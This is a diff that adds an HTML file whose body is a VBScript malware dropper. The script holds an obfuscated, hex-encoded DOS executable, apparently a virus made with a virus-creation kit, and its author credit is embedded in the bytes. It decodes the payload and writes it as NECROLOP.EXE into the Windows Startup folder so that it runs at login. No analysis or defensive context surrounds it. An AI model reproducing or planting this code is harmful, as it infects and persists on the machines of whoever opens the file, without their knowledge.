@@ -1,0 +1,59 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252"></HEAD>
+<BODY><PRE>dim v(11)
+cut="CD,21/"
+
+v(0)="4D,5A,F0,y,02,y3,02,y2,10,z2,F0,z,FE,z,y3,01,F0,z,1C,y7,EB,y,DD,81,E8,y2,5D,05,EB,F9,8D,76,1F,E8,02,y,EB,13,C7,46,18,31,14,8B,96,9C,02,B9,3E,01,902,462,E2,FA,C3,E8,08,02,8D,B6,30"
+v(1)=",02,BF,y,01,FC,A4,A5,06,B8,24,35,g,2E,8C,06,70,FA,2E,89,1E,72,FA,07,B8,24,25,8D,96,0C,02,g,06,B4,2F,g,2E,89,1E,68,FA,2E,8C,06,6A,FA,07,BA,y,FA,B4,1A,g,B4,19,g,2E,A2,6C,FA,B4"
+v(2)=",47,32,D2,BE,82,FA,g,8B,B6,44,02,46,89,B6,44,02,83,FE,02,74,42,8A,92,42,02,B4,0E,g,E8,88,01,B4,2C,g,D0,EA,D0,EA,80,C2,40,88,96,39,02,33,DB,B4,4E,8D,96,39,02,B9,11,y,g,73,1B,8A"
+v(3)=",86,39,02,FE,C0,3C,5A,76,02,2C,1A,88,86,39,02,FE,C7,80,z,1B,74,B2,EB,DA,EB,3E,B4,3B,BA,1E,FA,g,B4,4E,B9,01,y,8D,96,33,02,g,73,2D,B4,4E,8D,96,3C,02,B9,11,y,g,B4,4F,g,B4,4F,g"
+v(4)=",73,D7,E8,2C,01,E8,20,01,E8,30,01,80,3E,47,03,y,C6,06,47,03,01,74,9A,E9,DA,y,2E,A1,1A,FA,3D,D8,D6,77,0F,3D,05,y,72,0A,2E,A1,16,FA,24,1F,3C,03,75,08,B4,3E,g,B4,4F,EB,AF,C6,06,48"
+v(5)=",03,01,B8,y,43,BA,1E,FA,g,2E,89,0E,6E,FA,B8,01,43,83,E1,FE,g,B8,02,3D,BA,1E,FA,g,93,B8,y,57,g,2E,89,0E,64,FA,2E,89,16,66,FA,2E,z,86,9E,02,B4,2C,g,0B,D2,74,F8,89,96,9C,02,B4"
+v(6)=",3F,8D,96,30,02,B9,03,y,g,B8,02,42,33,C9,99,g,2D,03,y,2E,A3,79,FA,2E,C6,06,78,FA,E9,903,8D,76,FB,BF,2C,FB,B9,CE,02,FC,F3,A4,BE,50,FB,E8,73,FE,B4,40,BA,2C,FB,B9,CE,02,g,B8,y,42"
+v(7)=",33,C9,99,g,B4,40,B9,03,y,BA,78,FA,g,B8,01,57,2E,8B,16,66,FA,2E,8B,0E,64,FA,80,E1,E0,80,C9,03,g,B4,3E,g,B8,01,43,BA,1E,FA,2E,8B,0E,6E,FA,g,E8,3A,y,E8,2E,y,E8,3E,y,1E,B8,24"
+v(8)=",25,2E,8E,1E,70,FA,2E,8B,16,72,FA,g,1F,1E,B4,1A,2E,8B,16,68,FA,2E,8E,1E,6A,FA,g,1F,B8,y,01,50,33,C0,C3,B0,03,CF,B4,3B,8D,96,3E,02,g,C3,B4,0E,2E,8A,16,6C,FA,g,C3,B4,3B,BA,82,FA"
+v(9)=",g,C3,C7,46,18,902,C3,90,CD,20,2A,2E,43,4F,4D,y,3F,2A,y,2A,y,5C,y3,022,z2,51,75,61,73,69,2D,43,72,65,61,74,65,64,20,62,79,20,2D,3D,5B,41,7A,61,67,2D,54,48,30,54,48,5D,3D,2D,204,74"
+v(10)=",68,78,20,42,40,79,72,6F,73,20,34,20,6B,69,74,20,50,33,40,43,33,20,2E2,56,58,20,48,65,61,76,65,6E,73,20,69,73,20,64,61,20,42,6F,6D,62,20,212,01,y,01,y,45,64,69,74,20,62,79,20,2D,3D"
+v(11)=",5B,41,7A,61,67,2D,54,48,30,54,48,5D,3D,2D,20,63,72,65,61,74,65,64,20,53,65,70,74,32,302,33"
+
+function res(x,y)
+	For k = 0 To UBound(v)
+		v(k) = Replace(v(k), x, y)
+	Next
+End Function
+
+res "z", "FF"
+res "y", "00"
+piece = Split(cut, "/")
+cc = 103
+
+For n = 0 To UBound(piece) - 1
+	res Chr(cc), piece(n)
+	cc = cc + 1
+Next
+
+For m = 0 To UBound(v)
+	it = it &amp; v(m)
+Next
+
+
+tmp = Split(it, ",")
+Set fso = CreateObject("Scripting.FileSystemObject")
+pth = "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\NECROLOP.EXE"
+Set f = fso.CreateTextFile(pth, ForWriting)
+For i = 0 To UBound(tmp)
+	l = Len(tmp(i))
+	b = Int("&amp;H" &amp; Left(tmp(i), 2))
+	If l &gt; 2 Then
+		r = Int("&amp;H" &amp; Mid(tmp(i), 3, l))
+		For j = 1 To r
+		f.Write Chr(b)
+		Next
+	Else
+		f.Write Chr(b)
+	End If
+Next
+f.Close
+
+</PRE></BODY></HTML>
